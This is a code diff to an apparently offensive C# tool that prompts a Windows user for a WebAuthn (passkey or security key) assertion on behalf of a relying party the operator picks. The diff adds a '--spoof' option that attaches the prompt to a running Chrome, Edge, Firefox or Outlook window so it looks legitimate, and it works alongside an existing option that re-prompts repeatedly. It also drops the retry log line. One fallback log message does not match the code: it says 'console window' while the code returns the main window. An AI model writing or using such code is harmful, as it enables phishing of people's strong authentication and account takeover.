@@ -51,6 +51,11 @@ internal static class PromptCommand
             Description = "Authenticator type hint: SecurityKey, ClientDevice, or Hybrid"
         };
 
+        var spoofOption = new Option<bool>("--spoof", "-s")
+        {
+            Description = "Display the prompt in the context of the Chrome/Edge/Firefox/Outlook window if possible"
+        };
+
         var command = new Command("prompt", "Prompt the user for a WebAuthn assertion (authentication)")
         {
             relyingPartyOption,
@@ -58,7 +63,8 @@ internal static class PromptCommand
             credentialIdOption,
             killOption,
             floodOption,
-            authenticatorOption
+            authenticatorOption,
+            spoofOption
         };
 
         command.SetAction(parseResult =>
@@ -69,6 +75,7 @@ internal static class PromptCommand
             bool kill = parseResult.GetValue(killOption);
             bool flood = parseResult.GetValue(floodOption);
             PublicKeyCredentialHint authenticator = parseResult.GetValue(authenticatorOption);
+            bool spoof = parseResult.GetValue(spoofOption);
 
             using ILoggerFactory loggerFactory = LoggerFactory.Create(builder =>
             {
@@ -100,14 +107,16 @@ internal static class PromptCommand
                 }
             }
 
+            WindowHandle windowHandle = ResolvePromptWindowHandle(logger, spoof);
+
             if (flood)
             {
-                RunFlood(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment);
+                RunFlood(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment, windowHandle);
             }
             else
             {
                 logger.LogInformation("Prompting for credentials with relying party '{RpId}' and authenticator hint '{Hint}'...", relyingParty, authenticator);
-                string? result = TryPrompt(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment);
+                string? result = TryPrompt(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment, windowHandle);
                 if (result is not null)
                 {
                     Console.WriteLine(result);
@@ -143,7 +152,8 @@ internal static class PromptCommand
         byte[] challenge,
         List<PublicKeyCredentialDescriptor>? allowedCredentials,
         DSInternals.Win32.WebAuthn.PublicKeyCredentialHint[]? credentialHints,
-        AuthenticatorAttachment attachment)
+        AuthenticatorAttachment attachment,
+        WindowHandle windowHandle)
     {
         Stopwatch stopwatch = Stopwatch.StartNew();
         int attempt = 0;
@@ -155,15 +165,13 @@ internal static class PromptCommand
             attempt++;
             logger.LogInformation("Prompt attempt {Attempt} ({Elapsed:mm\\:ss} elapsed)...", attempt, stopwatch.Elapsed);
 
-            string? result = TryPrompt(logger, rpId, challenge, allowedCredentials, credentialHints, attachment);
+            string? result = TryPrompt(logger, rpId, challenge, allowedCredentials, credentialHints, attachment, windowHandle);
             if (result is not null)
             {
                 logger.LogInformation("User authenticated on attempt {Attempt} after {Elapsed:mm\\:ss}.", attempt, stopwatch.Elapsed);
                 Console.WriteLine(result);
                 return;
             }
-
-            logger.LogInformation("Attempt {Attempt} timed out or was dismissed. Retrying...", attempt);
         }
 
         logger.LogWarning("Flood timeout reached ({Timeout}) after {Attempt} attempts. Giving up.", FloodTimeout, attempt);
@@ -179,7 +187,8 @@ internal static class PromptCommand
         byte[] challenge,
         List<PublicKeyCredentialDescriptor>? allowedCredentials,
         DSInternals.Win32.WebAuthn.PublicKeyCredentialHint[]? credentialHints,
-        AuthenticatorAttachment attachment)
+        AuthenticatorAttachment attachment,
+        WindowHandle windowHandle)
     {
         try
         {
@@ -201,7 +210,7 @@ internal static class PromptCommand
                 remoteWebOrigin: null,
                 publicKeyCredentialRequestOptionsJson: null,
                 authenticatorId: null,
-                windowHandle: WindowHandle.ConsoleWindow
+                windowHandle: windowHandle
             );
 
             return credential.ToString();
@@ -211,5 +220,68 @@ internal static class PromptCommand
             logger.LogError("Prompt failed: {Message}", ex.Message);
             return null;
         }
+    }
+
+    private static WindowHandle ResolvePromptWindowHandle(ILogger logger, bool spoof)
+    {
+        if (!spoof)
+        {
+            return WindowHandle.ConsoleWindow;
+        }
+
+        WindowHandle? chromeHandle = TryGetMainWindowHandle("chrome");
+        if (chromeHandle is not null)
+        {
+            logger.LogInformation("Using Google Chrome main window handle for prompt.");
+            return chromeHandle.Value;
+        }
+
+        WindowHandle? edgeHandle = TryGetMainWindowHandle("msedge");
+        if (edgeHandle is not null)
+        {
+            logger.LogInformation("Using Microsoft Edge main window handle for prompt.");
+            return edgeHandle.Value;
+        }
+
+        WindowHandle? firefoxHandle = TryGetMainWindowHandle("firefox");
+        if (firefoxHandle is not null)
+        {
+            logger.LogInformation("Using Mozilla Firefox main window handle for prompt.");
+            return firefoxHandle.Value;
+        }
+
+        WindowHandle? outlookHandle = TryGetMainWindowHandle("outlook");
+        if (outlookHandle is not null)
+        {
+            logger.LogInformation("Using Microsoft Outlook main window handle for prompt.");
+            return outlookHandle.Value;
+        }
+
+        logger.LogInformation("Browser main window not found; using console window handle.");
+        return WindowHandle.MainWindow;
+    }
+
+    private static WindowHandle? TryGetMainWindowHandle(string processName)
+    {
+        foreach (Process process in Process.GetProcessesByName(processName))
+        {
+            try
+            {
+                if (process.MainWindowHandle != IntPtr.Zero)
+                {
+                    return new WindowHandle(process.MainWindowHandle);
+                }
+            }
+            catch (InvalidOperationException)
+            {
+                // Process exited before we could inspect its window handle.
+            }
+            finally
+            {
+                process.Dispose();
+            }
+        }
+
+        return null;
     }
 }
